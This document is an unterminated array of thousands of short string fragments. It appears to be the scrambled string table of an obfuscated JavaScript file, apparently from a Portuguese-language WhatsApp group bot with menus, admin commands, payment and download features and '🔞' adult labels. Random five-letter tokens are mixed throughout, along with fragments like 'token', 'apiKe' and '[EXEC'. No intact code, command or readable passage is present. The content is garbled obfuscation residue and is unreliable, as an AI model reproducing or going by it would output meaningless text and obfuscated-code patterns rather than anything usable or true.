'aleTi', 'SscjN', 'catio', 'util', '𝐃𝐈𝐍𝐇𝐀', 'JWUMg', 'true', "no é ", 'ovfPJ', 'biwkh', 'zFsft', 'JkYPf', "s\nexe", 'QjVrL', "\n  ║ ", 'kfFII', 'EzTAn', "vida ", 'i.ope', 'branc', 'RJlNj', 'antil', 'mNHdm', '/limi', 'kntVY', " U S ", 'vpZhi', 'ziLow', "LPE* ", '/josi', 'bWtva', 'CQlrV', 'KlaKW', 'zUDNg', '%20', 'ljrnk', 'YCafJ', 'DEOEW', 'JOGyM', "rtar ", 'pHjlW', 'im!', 'nada,', "ou um", 'bPpDF', 'SMtww', '01.0.', 'HWsso', 'ytcnm', 'TjJMG', 'IMkQC', 'eCKvO', 'zBOUw', 'esati', "🔞 𝐀𝐌𝐈", 'NqmcT', " enco", 'nWakd', 'kStEu', "ê rec", 'BVDCO', 'KXlhb', 'E7-mQ', 'zRpDk', "ra po", 'istên', '63b70', 'lo.', 'hrs,', " Ange", " 🅿🆄🆃🅰", "ntam ", 'pCnDM', 'JknLo', 'zvtow', '.what', '_repl', 'KeroT', '//ope', 'iHyup', 'um.', '842b3', "ar ⚠️*", 'oimg', 'ati', "ar, 0", ">\n\n", 'lular', 'qrMRV', " sext", "gem d", "iva d", "\n╰─「 ", 'dQoTu', "uco m", "to Vc", "ion @", 'CqyxE', 'VJGLC', 'remiu', " chan", 'yoYJH', 'QmvTP', '𝐌𝐀𝐑🔥', '𝐈𝐄🔥', 'axexv', "il @", 'tMupt', 'VHwIm', 'QmzPF', 'IYqCC', " SENP", 'SJyrx', 'cpoii', 'MaSxz', 'HCtEw', "ha ao", '99540', 'fyHZA', 'Rvmba', 'EAeHu', 'mgold', 'valor', "ue re", "ceu u", "❭ Suc", 'desbl', " _(AN", "u par", 'e-arc', "\nex: ", 'mer', "o id ", 'UCvFC', "HJ: ", "\n- Pr", 'infom', 'e=951', 'eQtio', 'dsKrI', 'unblo', " imag", 'hasVi', 'arvis', 'AiHsG', "% ❱ f", 'gflAV', 'dQxzX', 'qpglS', 'RMymc', 'wucpq', 'ZLSrH', 'erfei', " -mov", 'UPO!*', "63. ❄️", 'gue.', 'l.sir', 'inter', '1.35.', 'f.sir', 'ZqJNb', 'loque', "da do", 'lador', 'PKErU', 'ZriOy', 'CNgta', 'stado', 'OSbza', 'lucdb', 'nlqRD', '4|2', '·࣭࣪̇🔥ɴ', 'hbKGG', 'pFRXY', "o mui", "𝐄𝐒𝟏 ❄️", "opa o", 'gwybx', "e res", 'FyLpe', 'vLsaB', 'ZZtAr', 'qCfXB', " MEMB", 'supor', "A ❄️\n", "s rep", 'jvpEi', 'MNFmd', "\n*Ram", 'mando', " Pala", " Canc", 'ji.js', "p ama", "72. ❄️", '4%25&', 'ZUOjg', " 𝐦𝐞: ", 'hores', 'bSxab', 'FmoJT', "∆S RE", " 😏", 'UDSyJ', "o 😏: ", 'carde', 'HElJX', 'zpDAQ', "🇯🇵 𝗥𝗜𝗭", 'IUNrH', 'vsdxU', "r as ", "e Aut", 'clFGS', 'fda58', 'Ucdvk', 'eitos', 'DdrwZ', 'sion/', 'zwjfm', 'slWdp', "rio n", 'key_t', 'DtkjA', 'hackn', " no r", 'zhMvK', 'WkGrt', 'ByaeA', 'LOQUE', 'vRtZu', "ira, ", 'OYOAd', 'dyJQP', "ção ", 'iaORD', '3RuZm', "*\n*3 ", '|0|4|', 'JXmzM', 'IPqEx', " ou G", 'QqVzk', 'zgmla', 'cheio', "r 0", 'Url', 'EYHIc', 'I7ovh', 'DLLXt', 'gHzKJ', "éns 🎉", 'mVWqW', 'ncia,', 'zJUih', 'rte.', 'derro', "inho ", 'silei', 'mXAWq', 'arina', 'pp&re', "\nAdmi", 'eMFdx', 'notas', 'k|nov', 'anda', 'HxJcr', 'KFIWv', "vel a", " ----", "gem p", "𝟗 🔞", 'XeyBi', "ve re", 'FqbZf', 'tLJmA', '1c3dc', 'lbYWy', 'ATHDX', 'OxMbZ', " em a", 'ibdjz', 'IPpQh', 'gAitT', "e etc", "Ꭰϴ ϴ ", 'AGjxq', 'PpwAe', 'gado', 'lWVqq', " à li", 'rança', 'bhkdl', "to bo", 'otaçã', 'JCpyb', 'KZWkb', "nta: ", 'packv', 'lHFNm', 'prTph', "upo! ", 'safia', "i:\n", 'FunzK', 'dYxEf', 'bmjpp', "._\n🤖 ", 'probl', '|3|1', "+55 1", 'GoUZG', 'vos', 'GdWgE', 'rimin', 'ponse', 'on/bo', "ela c", 'NTRAR', 'REALI', 'yokLZ', "ario ", "𝑶 2 📀", '𝐆𝐀𝐋𝐕𝐀̃', 'sRDfJ', 'utoma', '7|0|5', 'utame', "les s", 'TnPJx', 'tençã', 'FugoY', 'KzMSP', 'Funçõ', 'apiKe', 'ofw1c', 'kFeLh', 'inhas', 'kLqLz', "er di", "ado e", 'ftYJN', "IX RI", 'fMkPl', " 〕:「 ", 'ORXqU', 'são', 'Gkejv', 'RxoRo', 'bARkp', 'htzhz', 'APK+O', 'ndyVj', 'LKQcr', " modi", 'QteYN', "seu w", 'ON:', 'roubo', "ela j", 'kynal', '9999', 'KmCTA', "ta at", 'menu_', 'OnwtP', "❄️ 𝐀𝐒𝐔", "DDD ", "N hrp", 'HaXMl', 'zqnzG', 'CjPKy', 'rlnhX', 'lapis', '𝐋𝐏𝐇𝐈𝐍', 'divug', "l Wor", 'Conta', 'scale', "ê gan", 'recru', 'riasi', "𝐑𝐈𝐎 🔞", 'wHoDd', 'dKGLY', 'kosLH', 'vWuou', 'pp.ne', 'JCzNN', 'zbePJ', 'TFGVa', 'BwmCc', "to. E", 'colMe', 'tEoio', 'bQxOy', 'okmMX', 'CiYqd', 'gZSMK', '𝐈𝐁𝐄𝐈𝐑', 'Aceit', 'finid', 'vckQb', "❄️ 𝐓𝐑𝐈", "do di", 'FIVHM', 'NoQoX', 'iro:', "os os", "*✅ EU", 'DynyP', 'jLchV', "O FEC", 'EsIxE', "paga ", '.onli', 'vifeQ', "se co", 'eSeGp', 'eKJaQ', "o 1", "2. 🔞 ", 'ZVOqW', "uto.\n", 'hCImp', 'bHXZR', " cor ", 'polít', 'ehnUW', "\nApós", '4|3|5', "es nã", 'VVEja', "ar, s", 'XbQVR', 'metal', 'árias', 'NhRKD', 'glGoe', "𝐄𝐒 ❄️", 'obKel', 'k/<fi', 'mplo1', 'iCkxv', 'cts&e', 'axQcV', 'RJcjb', 'nte.', 'poDyL', " seja", 'uBHWK', "CÊ PO", 'SvYki', 'bTrPc', "one u", 'UMeEN', 'xmXYN', 'BVDOh', "*\n├ O", 'lEFuy', "ra: ", 'eheXA', 'zouei', 'ze=25', 'hã..', "ao ma", '】ʙᴀɪᴀ', 'CmJtY', 'thres', 'aIQdl', 'ESmAd', 'zHJll', 'WEWBl', '12:05', "o ele", 'cacnt', 'EYFcu', 'infEd', "ubar ", 'TEsSG', 'hBUwv', "só pa", "\n\nSeu", 'uDwdw', 'vBhGQ', 'GmGUY', 'eira:', 'lFbpy', "9 nes", "vai r", 'PSIFz', "- Os ", 'rsofm', 'e/%20', 'state', " OCIO", "s par", 'SJVzD', 'kereL', 'VENCI', 'isfSN', "ão rá", "a nov", 'aiadc', "r, fo", 'jKphj', "ndo f", "r emb", "cê vo", 'vLofy', 'vGzLa', 'mMxhG', "Cʜᴀᴛ ", 'stimo', "rá no", 'otext', 'QKKKu', 'dxJtj', 'apaga', 'badde', 'BsCQe', 'Sigma', "r a m", 'WymtB', 'NTUAÇ', 'ntipv', "𝐑 𝐎 𝐒", 'LcquT', 'ome:*', '4752535crTMlb', 'v13.6', "YS DO", 'Data', 'ahlNr', 'oopee', 'GdSQn', " se e", 'antsU', 'DHUvh', 'APexv', 'gjmon', 'dDiSy', 'dKHeI', 'KmaVz', 'img', "iar o", '=14&t', 'ZqILs', "ou 1 ", 'IAXDj', 'mubvb', 'twzUR', 'e/hcs', 'NOyVo', " cust", 'tory', 'a0d9e', "s Pix", 'ca4ef', 'VxDkg', 'wnurs', "o em,", "or oc", 'nk|no', 'VLMcq', "\n💻 Si", 'ioTqo', 'yMSBc', '🙂🖕', 'ile/f', 'LSNuK', '@c.us', 'JClbe', ':2557', " ZORA", 'owner', 'QsIRh', 'Rdcka', 'wLede', 'WrOzQ', 'aTyHv', "de te", 'CJfuL', 'ortea', 'ecFLV', 'yeCPg', '//bad', "🍀💰 *H", " -ar ", 'vxyz]', "ndo 2", 'helpp', 'eResp', 'ClEcj', 'tAEcQ', ", Voc", 'kkLlx', "oa, e", " ou a", "dos d", 'ajsXd', 'TkQcj', "NK DO", 'KluUx', 'râmet', 'HBGtP', "𝐀: ", 'LEAGU', 'byyVy', 'afYFG', "rá an", 'io-op', '𝐖𝐀𝐈𝐅𝐔', 'XtqJr', 'r.jpg', 'HLjAk', "pção\n", " _\n\nS", 'IhAJP', 'IqHay', '8bbd6', 'orca', 'OWTIW', 'QPwpP', 'NT_RE', 'LEsXE', 'QzPKh', "DAS1 ", '=40&t', 'PNkOb', 'WaYpc', 'AQLIc', 'winge', 'lmiOW', 'LHaUS', "➣ @", 'xeZmB', 'Erros', 'd785f', 'LTBxV', 'NUHJQ', 'hHuSj', 'SpWBm', 'TGcvF', 'PmdJH', " Que ", '₊ꞋꞌꞋꞌ', 'lham.', 'MrFNG', 'mFJER', "IKER\n", 'kSLuZ', "nde m", 'ELOCI', 'tGbXw', "┉┉┉╝\n", 'pkRje', 'ca.Sa', "11. 📍", "Use ", 'so0/A', 'aixar', "Uma c", "lhar ", 'VYRbI', 'ririq', 'txAoK', 'staco', 'iFyOO', 'acant', "OITE ", " fórm", 'rio', 'efix', 'SBzff', 'KoWBP', " 🟦🟦🟦🟦", 'PHOEN', 'ctx95', 'EvTDz', 'Odlea', 'exif', 'HhXFV', " gold", 'ckNqk', 'SERI', 'Lhyac', 'arvel', 'vmCbv', 'WLACA', 'FgicZ', 'iHPjh', 'QUUDw', 'VlRPp', 'zVYBW', 'HnRie', "e vis", 'enove', "\nData", 'UMoNz', " acer", 'YmQIl', "𝐀 🇯🇯🇵", 'pTBGt', 'iIQSL', 'ILjxG', 'ck-pu', 'jDHht', 'gif/p', 'yKwix', "lds\nE", 'YHJxD', '.orig', 'biZEi', "5 men", 'hFvVb', "car: ", 'fotob', 'cwDrV', 'pismF', 'upguq', "uper ", 'SENIE', 'lovin', 'tmjax', 'yXDgv', 'LdJft', 'oXEBQ', "ão qu", "ts in", 'iyqgd', 'dqymt', 'nce', 'kSync', '(Grup', "u em ", 'Xypnj', 'madei', "\n\nInf", 'zppdJ', 's/egr', " 1h p", 'oZjAv', 'IOiaa', 'wckQr', 'nnBeD', 'ens..', 'KjQgZ', 'vendo', 'Belle', " Zomb", 'zPWel', 'TmOmM', 'NYjPW', 'BHcHO', 'luIKl', "\n_- R", 'kGQxb', 'Ganha', "omo l", 'lhsnc', 'so...', '/wa.m', 'yFxtJ', 'TKWXd', 'RgKZL', 's.sir', 'veita', "eu 25", "* @", " o au", "e ent", 'SVpwD', '_br', "eio :", 'FNkdy', 'n&tex', 'ucDjY', '[EXEC', 'biINQ', "am su", 'ZWmmL', 'gtUma', 'YQafq', 'kx0ie', 'lPWiQ', 'ObjNv', 'cb54a', 'rInnn', '-vsyn', 'Token', "n Mus", 'zwnau', 'GIYtU', 'IpCbJ', 'AQGQZ', 'VpOyj', " )\n\n", 'JyXxD', 'Psxhg', " MAIO", " do p", 'uFUVy', 'qYdQK', 'cLnZG', "to ac", "ji go", 'rigat', 'WiBJo', 'ZQbDR', 'HVckR', 'clwma', 'ic&la', 'e-tra', 'm2/an', 'Infel', 'EQyig', 'RFfqQ', 'argol', "t ira", 'aKgZF', 'EYidA', 'DYIhd', 'NcIEw', 'kTNwk', "𝐏𝐀𝐈 ❄️", 'xQSki', "TSU ❄️", "O*\n\n*", 'otos', "a 😳", "deu ", 'DxakP', 'zMTlR', 'ZKQli', 'PXiHh', " gost", " @mem", 'rTquH', ", Exe", 'HhSJC', 'elada', 'CMnZb', 'gzIIY', "o (Nú", 'aluga', 'mero,', "𝐈 🔞", 'GrjLy', "M -s ", 'aZcDe', 'HH314', '389e0', 'mOgoR', "o:\nId", 'ocYVR', 'fBswK', " dano", 'jKFCX', 'rEbwX', "30. ❄️", 'OcglO', "á enc", 'teps', 'jAwdk', 'vHjqk', 'wQhur', 'CEHlN', "ia, e", "vas p", 'GWlLP', '161nOVJyX', "ile\n\n", 'WnHzJ', 'pYXzY', 'rKqxY', '/alea', 't.1.f', 'kikfT', 'sejk9', 'SlSOg', "u a p", 'ofeJw', 'jMylk', 'blood', 'ijyql', '_Of_C', " cmd ", 'Cnixn', 'xstDT', 'QkgXP', " Agor", "s nel", 'ivo', "9. 🕹️ ", 'ZoYlL', 'KAU4S', 'KiLrb', 'INIST', 'SXYaV', 'UqQvI', 'ddalw', " né", "ig ma", 'wReEr', 'NHVVV', 'br&su', 'doxnL', " tale", 'uwTOk', 'WcfPI', 'LEPRE', " esfo", " -fil", '&page', 'MroCm', 'o_Pau', 'elhor', 'ExZLN', 'evelo', "ado n", 'PSjKf', 'zpzWF', 'xvJYA', 'nQsOR', 'HHCoQ', "ira t", 'unYMj', "io ", 'dpawl', '468bb', " forn", 'VsfIs', 'uxeKW', "10d o", "ldo d", 'BoJMd', 'MyHqy', " bot.", "u, Ca", 'iXxkt', 'HMLMH', 'csCYW', 'MdccW', 'roces', "é het", 'pCyIv', "o: ( ", 'A_v2.', 'OcpSD', "or so", " bot", 'mador', "gere ", 'zpDpK', 'UAhVc', "26. ❄️", 'mjbsp', "Em ho", 'pHHIa', 'play7', "\n-> c", "TY ❄️\n", "𝐗𝐈𝐌𝐀 ", "sua a", 'qVpBO', 'Nisjo', 'jtBpY', 'edire', 'LOfKr', " 🇰 🇸 ", 'music', "cade ", "gold ", " MIDO", '://ap', 'AacXk', 'mBNZH', 'mZqAy', 'CfoHb', "a.\nNú", 'BJKuT', 'KwuJa', 'QeJcU', 'DKDXa', 'eINST', "é Fei", 'Menor', 'ojLQZ', 'cIoeF', "Zap z", 'IFfam', 'dIyyQ', 'SBLMV', 'qeNZQ', 'JFymS', 'UIntL', '𝐄𝐑𝐂̧𝐎🔥', 'ZlMsQ', "ao bu", 'ck/', 'CWydB', 'TbGUu', 'knGtT', "uem i", "u igu", "𝐈 𝐂𝐎𝐍", " 𝐆𝐈𝐎𝐕", "el pa", 'e1a65', 'mYEyX', 'lJmmG', "\n_*", 'fCpQZ', 'evxMI', "𝐔𝐓𝐎 ❄️", 'nesto', 'ENrxD', 'ive', "nce p", 'kTyWz', " Rute", "DOS 5", 'POST', 'NMaru', 'exemp', 'reito', '.matc', 'XMyRT', " naru", 'FZAKO', 'yqeeO', 'AoJeQ', 'NwThY', 'viand', 'ome/1', 'ykOLo', " do s", 'yuyhf', 'onxCp', 'MaKUL', 'WqgdV', 'rcyOW', 'LkPJn', "𝐔𝐃𝐈𝐎 ", "╦╤─ ҉", "ndo r", '𝐎𝐍𝐓𝐀𝐓', 'ck-te', 'VquXf', 'dxuPy', "- Cli", 'rteLI', 'XRQuv', 'WLxLo', 'uyHNK', 'tLuGu', 'lZorp', 'JqvwM', 'abmIO', 'fixo.', 'tsaOx', 'CBLDD', "ios m", "❄️ 𝐍𝐀𝐆", 'zocGJ', 'WVXHT', 'oFViq', "rá qu", 'bheyV', 'fhvRo', 'XWJlD', "/rpa ", 'previ', "❄️ 𝐒𝐇𝐈", 'HAMEN', "dos p", 'UbQuG', 'gVqtI', '𝐓𝐎́𝐑𝐈𝐎', 'ão:', 'reu..', 'LkdKH', 'WRDTP', 'yjUhB', 'BwTmy', 'kwai.', 'ssoas', " 2\n(A", 'lava', "ovo r", 'warde', "u o @", 'szLYY', 'ação:', 'xVmYc', 'uYYCL', 'tDMno', "𝐃𝐎 𝐁𝐎", 'CZjXs', 'DSIQv', 'aceit', "s 50 ", '/prox', 'yatTc', 'Q9ipO', 'apple', 'cXjEG', 'azRpe', "ro ", 'noVid', 'XDUlS', 'SuWub', "UPO: ", 'om/fi', "a dic", 'LuhRP', 'EzKDr', 'qkxLr', "5. 🕹️ ", 'vity=', 's/Rut', 'xwMll', 'uDxVq', 'Hdrwl', 'nalAd', 'Chifr', 'jvsRd', 'reagi', 'VYLLJ', "e:* ", 'cipan', 'NyWHv', 'xhxTj', 'Premi', "l rem", "á reg", "xo pl", 'fSQlm', 'EPIri', 'mEUwt', 'iJhyA', 'NNOlT', 'LzBHN', 'ejYNr', "de: ", 'fBcNt', "➤ *", 'KZoOe', 'fqHWT', 'rzuhh', 'unda-', 'IXrar', '.mp3', 'wmDxd', 'bhdQW', '/audi', 'sGLgq', '0.tex', 'ExFqe', "?*\n\n*", 'upokw', 'lerfo', "m uma", "r só ", 'zPdux', 'name:', 'ether', 'undos', 'de.', 'laERJ', 'wnQbJ', 'wBumm', 'Persk', "ds. U", 'criad', '0f29b', "ge ab", 'dSCwT', 'uecrs', 'ogiOn', 'AvHuM', "e 100", 'QPmzR', 'ADD', 'mUAXk', 'irYXW', 'progr', 'autor', "[⛩️] ", 'pena.', 'RMWbg', "nto o", '45305', 'mp3', 'rIVcy', 'atenç', 'dedTe', "tar o", 'gp2', 'zAAUc', "sta? ", "ga fe", 'axoWZ', 'BdWrw', "𝐀𝐏𝐄𝐑 ", 'o..', 'Demai', "io ( ", " Vita", 'HTHIi', 'atent', "io au", 'CGbdx', 'nDQee', 'ZwRsa', " ..", 'nCLAs', "para\n", "?\n\n1 ", 'WfWxq', " a pr", '--sco', "m sal", " *ERR", 'FyFJU', 'Brend', "ndo n", 'FqSUS', 'oadTr', 'go.cl', 'sJzLh', 'm57w/', 'qYowM', "O 🤙\n🪀", 'roeza', 'CcnSg', 'segui', "obre ", 'QHcqh', " GP!!", 'vesti', 'pvbtg', " 〕: 「", 'sUV0m', 'Wgrbp', " 𝐖𝐀𝐋𝐋", 'slot', 'idkxV', 'HepCS', 'OmRBq', 'ztsPj', 'and=', "um ad", 'RBREP', '-+---', 'mGohS', '6|5|0', "𝐔 🔞", 'ahmgg', 'MdydV', " LUM ", 'KdUYK', " Tenh", '1|3|4', "vo. D", "o adv", 'hassB', '700&t', 'Andro', " 𝐊𝐀𝐑𝐕", "m por", 'OcbJU', "do 30", "*O re", 'msg-a', 'yUcmL', 'acaso', " algu", 'PJHWo', 'KdyFe', "mo 24", 'Kppvw', "do so", 'stame', "ia 🔞\n", 'Lotus', 'jofYd', " 1 pa", 'zLCyR', " ser ", "m = 1", 'ojARY', 'aaWBI', 'wOoFm', 'wBwvX', '𝐈𝐎𝐊𝐀𝟐', "rei u", "Por f", 'zPHkW', 'ios', "i Ren", 'olver', 'QuVIs', 'rFqSK', "a. Co", 'AHtQM', "Boa m", "𝐈𝐍𝐊 ✅", "rio o", 'perdi', 'zBuaN', 'oolPa', 'EoToL', "ue o ", 'sFJBR', 'minha', 'WEBwt', 'ng+v5', 'de137', 'lCjBD', 'EbQnz', "l*\n!c", 'MiMf-', 'NoWYU', 'lMiqH', 'RrTEB', "Vc De", " Pape", "po On", "gem o", "m nes", ": alt", 'eZVOT', 'Spoti', 'ZxOYM', 'vdWBK', 'SG_59', 'tvhkY', 'ieUDO', " empr", 'searc', 'DCyUF', 'b79a4', 'sFzHV', 'gitcl', 'bMRns', 'KoyMd', 'angba', 'tHyxh', 'no?', 'qqjbA', 'VRTKB', "\nPrim", 'mais,', 'JmmIu', "VOCÊ ", 'aCele', "\n📂 Ve", 'preta', "nte a", 'otFFE', 'QkFUh', "de jo", 'xzxIX', "ath d", 'TYhHH', 'QVtyR', 'AyxNC', 'ician', 'xFdiM', 'ZfxDn', 'caNPe', 'vXNcC', 'IYWpe', 'CBZgk', "   💨\n", 'puDzc', 'oCMRu', 'MawBv', 'ban', "chip ", "ro in", " a bu", 'zKftq', 'oWuFQ', 'GioXD', 'SES', 'PTHZ4', 'npfDz', "dio! ", 'tsaOF', 'uMgxS', 'ZPmmN', 'BbDoO', 'revel', "o vaz", 'tEKKo', 'MIVLg', "or: 1", 'ukuwX', 'pDcva', "remo ", 'NJCux', 'dia', ") p/ ", "eja a", 'RIMIN', 'text1', 'Qbmow', 'QqUDz', 'qnkVI', 'KyhiE', 'ficti', '135', "cida ", 'dJQER', 'ICIPA', 'HMizG', 'oNvtk', 'vTqha', 'rLYON', '00-e2', "nas n", "de ut", "vai m", 'YcVng', 'sirir', 'tab/g', "\nTipo", 'ejuLs', "do qu", 'FZMcp', 'BkmHf', 'BgSXs', 'Wjuek', "o Adm", '𝐈𝐙𝐀𝐈𝟏', 'lwFLS', 'UVsqm', 'mOvLg', 'pJnwm', '*RANK', "o usu", "o, o ", 'HebpN', 'EUlSg', 'LGxBQ', 'qnt_m', 'e_sel', 'Usuár', 'olici', 'DOGvL', "mas e", 'a-dow', " Foi ", 'RbrIm', 'wNlDQ', "✥ Par", 'LSSJN', 'RcjJn', " /10 ", 'LyTGg', 'eqKCx', 'axMfD', "22. 🔞", "m sor", "tou e", 'IbEYY', 'DoGnD', 'mplet', 's/Lay', 'KSlpe', 'vkTib', 'UXlna', 'CPhvN', "𝐎̃𝐄𝐒 ✅", 'url', 'kyEUN', 'Fucqi', 'cassi', 'LXpWs', 'wJNbG', "éns ", 'HypYG', 'IS*', "o sem", 'zVQpB', 'gZsVe', 'r-msg', 'NqsGy', 'resso', 'eKsNp', 'qJfWI', "✔️ O r", '3r03l', 'zHScL', 'EUOOU', 'fBVPk', "ts gr", " maxi", "Ja es", 'figme', "rs bo", 'infol', 'HeeAh', "nte, ", 'DndXv', 'qjkfH', 'ie/%2', 'WgTmO', 'e790f', 'eJELX', 'reviv', 'orçar', "𝐍𝐓𝐈 𝐌", 'cpPXz', " No S", 'ReDKe', 'hYwWU', "tade ", "🐂🐃\n\n", 'ZIVRo', '360p', 'yvdPN', 'yBeVr', 'YkjAg', "a das", 'rgdWq', "ro de", 'QWbxc', 'cvSiv', 'hYjUc', 'odgEi', 'FRsNY', "e \"ac", "zes h", "oa, v", 'SIoIe', 'zIANd', 'raoha', '𝐌𝐄𝐍𝐔2', '13.jp', "é vol", 'hMifT', 'uZFUt', '𝐄𝐀𝐓𝐇𝟏', "ntes ", "do fe", 'AbXks', 'uAZgp', "r a q", "[1;3", 'Holxv', 'yeFtT', 'tVpgC', "a te ", 'takbp', 'sdMqI', 'pkvWZ', 'oOBWM', "iros ", "ões d", 'AAyrr', "os pa", 'BBHOt', "das f", 'iDbia', 'bDgVR', 'gJHqV', 'nfBwQ', " quer", 'Ganho', 'ObAdO', "ê que", "ki 4", 'vYPml', 'casam', 'LhPIi', "𝐘𝐏𝐄 🔞", 'oaiBY', 'zUyGz', 'FdAaY', 'NIENT', 'Humm,', 'AZVyR', 'on/qu', 'CSkwZ', 'rRBlu', 'ecurs', 'GSoXu', '/corn', 'HUuUU', 'entes', "OS TA", 'yS09G', 'zfioK', 'aKcEq', 'roup.', "😏\n\n「 ", 'oeADw', "ta de", 'SZeHj', 'lastu', 'uiser', 'nome_', 'hPUoB', "i sim", "a tab", 'dYGuE', 'VGfYC', 'pBEpC', '20e19', 'eZfEA', 'vVgRp', 'gLJke', 'VnXFQ', " 🎧 𝑨𝑼", "ta ne", 'FGyyG', '320,i', " 𝐔𝐒𝐀𝐃", 'XEMPL', 'xQOkB', 'Digit', 'wDTSE', 'sKGSW', 'azlSY', 'ONYzH', 'ecebe', 'upado', 'AllPa', "nas d", 'OJCiT', " ❄️ Me", "arc 0", "LASH ", "lv 🔞\n", "mbre ", 's|ESD', 'dKRaQ', 'ndo..', 'qisYU', "17. ❄️", "🔍 _Pr", 'ps://', 'Jogue', 'quist', 'PJruu', "IN* :", 'DRhpK', 'NYZDW', 'roglo', 'sMgBS', 'dgcHX', 'jdIFh', 'vDhrS', ", ava", 'menuf', 'Kwtdo', " :/", 'rISBm', 'ovida', " ENFE", "A ima", '》━◌━╮', 'U1jMP', 'XbDTy', "nhar ", 'Calma', 'Qpwff', 'zutjH', 'Siste', 'KzJVb', 'nicio', 'kOHpg', 'JnOLD', "da al", '5&tex', 'ACyur', 'ion.y', 'xAdKR', "▄▄▂\n◢", 'VBmwU', 'UgCcd', " GADO", '𝐝𝐚𝐝𝐞:', 'nQgPY', "ck in", "no ol", '𝐀𝐆𝐀𝐖𝐀', 'NOvlt', 'ciRXh', 'Lkhgy', 'mWoch', 'oment', 'EqoZz', 'ticke', 'YgDqh', 'jrPNy', " Únic", "✅O re", 'suced', 'AwhMZ', '00:00', 'KnyQB', 'jqbqW', 'CtdcR', 'JPiFe', 'euzwZ', 'faRJd', 'sso', 'bxOhz', "TI CA", 'Gacor', 'r4OSk', "\n\n👻 𝐌", 'konSv', 'ff000', " pro ", 'u,Cai', "o, sa", "o\n\nBo", "i mai", 'vWxzL', " ja e", 'xjXyE', " ente", ":mm e", '/ganh', "DE - ", 'ost.c', "ir Do", 'tveyr', 'Cejpf', 'kWWVm', 'txuBP', 'zVEAD', 'UVQpG', "2 log", ". Imp", 'CFklq', 'zIyIU', 'qrBqS', 'bmaPY', "er en", 'ATihV', 'accou', 'ITYJe', 'KztRW', 'ixPHd', "de vi", 'fILMR', "\n\n- G", 'pIKLU', 'URgCN', 'KzfbI', 'sQfaw', 'appId', " Só d", 'tymas', 'm51o3', 'bITqd', "está ", "\n\n🕹️ E", 'EYoCZ', 'VnHUt', 'nvFXi', "do co", " menu", "ie, m", 'tXPgg', 'YeqRo', 'halix', "o 500", 'VzvTR', "SO\nht", 'izGdx', 'jnoSE', 'cVllD', 'edra,', 'lYyxx', 'onedJ', "ʙʀᴇ🪙 ", 'nzKCH', 'joDIR', " cora", " tal ", 'JYkci', 'Reaja', 'JLtFS', 'NmenI', 'GRWgr', " alug", 'V0_X0', 'iLchv', "tos a", 'crVSX', "mos e", "já ac", 'qpngP', "i doc", 'bmBRd', 'pgjTv', 'mero?', 'kyiCN', 'rupos', 'TxsCY', 'xXCng', 'oojxY', 'ar..', "é qua", 'vvEFk', 'KpFbL', "ade: ", "ro nã", "va, u", 'VcdNa', 'json', 'vfPZT', 'yOqMH', 'nJVoV', "\n\n*😭 ", "O cos", 'descu', 'pIEDG', "v2\n\n-", 'AeJUT', 'ceAll', 'IWCFu', "eo: ", " dese", 'aHzkq', 'v2.36', 'vgWnW', 'ra.co', 'OoDmt', 'erter', "da, e", 'lans_', "m 0 m", "cê fo", " http", 'locar', 'ROIBI', 'GmoLq', 'smoke', 'EFAAj', 'RWUnd', 'uNpgF', 'nao_v', "𝗧𝗔 🇯🇵", 'mNqis', 'WEsVP', 'on/ca', 'unida', 'TmYXE', "nas u", 'szjYg', 'DXztp', '*/*', 'aina', "rá en", "ixo v", "\n\nLim", 'AA5E7', 'QGQzE', 'pagei', 'uxQrQ', 'prese', "A Onl", "m\n\n- ", '7946d', 'zoopz', " plás", 'LJbFb', 'jJYXN', "a se ", 'bOEbR', "ão bo", "o é @", 'Corno', "」*\nVo", 'ec_gl', 'XGBkp', '𝐈𝐒𝐀/𝐃', 'KHJsS', 'HYPmr', 'zZlnA', 'PZwqG', 'PFYYS', " , ag", 'reini', 'KhEdb', 'iYzdN', 'psHPV', 'bfCMn', 'FoROR', 'Vjzui', 'RvTBh', "ndo ", 'ESCRI', 'mpo=1', 'zenar', 'ldade', 'Jkusn', 'ehg', 'assig', 'kOKKg', 'hYGcX', '𝐈🔥', 'eOJWn', 'RGtCT', 'oGGfr', 'lAiRv', 'tycLG', 'Flslo', 'APWzL', 'ls?id', 'IbQwi', 'Áudio', 'pt-BR', "🇯🇵 𝗬𝗢𝗧", '://br', 'dbjOI', 'XGfCD', 'ٜꔷ⃔໑࣭࣭', 'ecusa', 'qUVqq', 'PgBgT', 'bJmaZ', 'proto', "so va", 'BfrmW', 'OoLgU', "mo.\n\n", '/gdri', 'iyama', "de go", 'oQafv', 'JtVyM', 'ZjWeY', 'sAkcH', 'imnhz', 'fIXKj', 'gqIWq', 'Npzmb', 'o.zip', 'token', ';[0:a', "o sep", 'fbkBu', 'yOXxv', 'LOvFf', 'YaFgJ', 'ebeda', 'jWHvx', 'UztZu', 'GOLHx', "á na ", '752be', 'bhVpK', '183.1', 'm/tra', "io: ", 'bMkQa', 'banir', "ÍDO S", '1:col', " bani", 'UALYG', " Vent", 'dade!', 'STiae', 'GPmuc', 'YARFz', 'LMBwT', 'xwKZe', '/imag', 'NxvVU', "REAM ", 'SFYWE', " alea", 'on/ms', " o úl", 'if%20', " 🔞\n", "a dat", 'oNlPb', 'HCbcj', "mo, o", 'packp', 'jtbrX', 'XcRRz', 'USzkc', 'nipul', 'LhYNK', 'ySggR', 'penas', 'pihZo', 'VkGkr', 'OkkqK', 'nica,', 'OMnDz', 'oQXFp', 'Capit', 'serid', 'negra', "\n\n\n👾 ", 'mvJDy', "a, pa", 'bnErF', 'Pcthu', 'fAylx', 'mdgmb', 'qNxXB', 'VUMZQ', " deno", "𝐑 𝐒𝐎 ", 'aaDfd', 'b0cef', 'ZKHJs', 'witch', " falh", 'sort', 'tureU', "Anti ", 'mensa', 'tente', 'aDeID', '|sim', 'GzaTX', '8031e', "s lem", 'ᴍᴀɢʀᴀ', "ू ፝͜❥ ", 'gundo', '//kai', 'hqDmU', 'JFrnT', "cisa ", 'bilwx', 'inka', "A 👑* ", "é Mia", " Próx", "𝐔𝐊𝐎𝟐 ", "STA* ", "s.. ", 'menor', "ada*\n", 'tywlw', 'vWcad', 'ornec', "ras n", 'xYuWo', 'NORHB', 'ZMSzL', 'MBGpa', 'XIGFN', 'ansmi', 'QIiln', 'prop=', 'riada', 'ktGZA', 'MhUrC', 'sRDRm', " resp", 'pheme', 'xMNLI', "ar á ", "sa me", "\n══╩═", 'RATLA', 'wopqw', 'IxDqr', 'scdQY', 'Enwyt', 'wellc', "s. Ma", 